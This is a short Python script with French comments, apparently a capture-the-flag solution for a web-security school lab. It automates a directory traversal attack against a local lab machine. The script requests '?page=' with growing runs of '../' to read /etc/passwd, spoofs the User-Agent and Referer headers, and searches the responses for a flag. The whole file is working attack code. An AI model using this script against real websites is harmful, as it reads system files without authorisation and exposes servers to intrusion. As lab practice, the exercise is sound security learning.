import requests
import re
from urllib.parse import urljoin

def test_path_traversal(base_url, max_depth=10):
    """
    Teste différentes profondeurs de traversée de répertoire pour trouver le flag.
    
    Args:
        base_url (str): L'URL de base du site web
        max_depth (int): Profondeur maximale de traversée à tester
    """
    headers = {
        'User-Agent': 'ft_bornToSec',
        'Referer': 'https://www.nsa.gov/'
    }
    
    flag_pattern = re.compile(r'flag.*?:[^<]*')
    
    for depth in range(max_depth + 1):
        traversal = '../' * depth
        path = f'?page={traversal}etc/passwd'
        full_url = urljoin(base_url, path)
        
        print(f"\nTest de profondeur {depth}: {full_url}")
        
        try:
            response = requests.get(full_url, headers=headers)
            
            if 'flag' in response.text.lower():
                matches = flag_pattern.findall(response.text)
                if matches:
                    print("\n🎯 Flag trouvé!")
                    print(f"Profondeur: {depth}")
                    print(f"URL: {full_url}")
                    print(f"Flag: {matches[0]}")
                    return True
                
            print(f"Status: {response.status_code}")
            if len(response.text) > 100:
                preview = response.text[:100] + "..."
            else:
                preview = response.text
            print(f"Preview: {preview}")
            
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la requête: {e}")
    
    print("\n❌ Aucun flag trouvé après avoir testé toutes les profondeurs.")
    return False

if __name__ == "__main__":
    TARGET_URL = "http://192.168.56.102/"  
    MAX_DEPTH = 10
    
    print("🔍 Démarrage du test de Directory Traversal")
    print(f"URL cible: {TARGET_URL}")
    print(f"Profondeur maximale: {MAX_DEPTH}")
    
    test_path_traversal(TARGET_URL, MAX_DEPTH)